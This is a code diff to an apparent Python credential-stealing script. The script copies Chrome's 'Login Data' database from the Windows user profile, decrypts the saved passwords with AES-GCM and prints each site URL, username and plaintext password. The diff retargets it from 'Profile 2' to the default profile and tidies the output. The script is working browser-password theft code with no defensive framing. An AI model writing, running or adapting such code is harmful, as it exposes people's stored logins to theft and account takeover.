@@ -19,11 +19,10 @@ def decrypt_password(password, key):
     iv = password[3:15]
     password = password[15:]
     cipher = AES.new(key, AES.MODE_GCM, iv)
-    return cipher.decrypt(password)[:-16].decode(errors='ignore')
-
+    return cipher.decrypt(password)[:-16].decode()
 
 if __name__ == "__main__":
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 2", "Login Data")
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
     login_data_copy = "login_data_temp.db"
     shutil.copyfile(db_path, login_data_copy)
     
@@ -37,4 +36,4 @@ if __name__ == "__main__":
         site_url, username, encrypted_password = row
         password = decrypt_password(encrypted_password, windows_userkey)
         if len(password) > 0 and len(username) > 0:
-            print("URL: {}, Username:{}, Password:{}".format(site_url, username, password))
+            print("URL: {}, Username: {}, Password: {}".format(site_url, username, password))
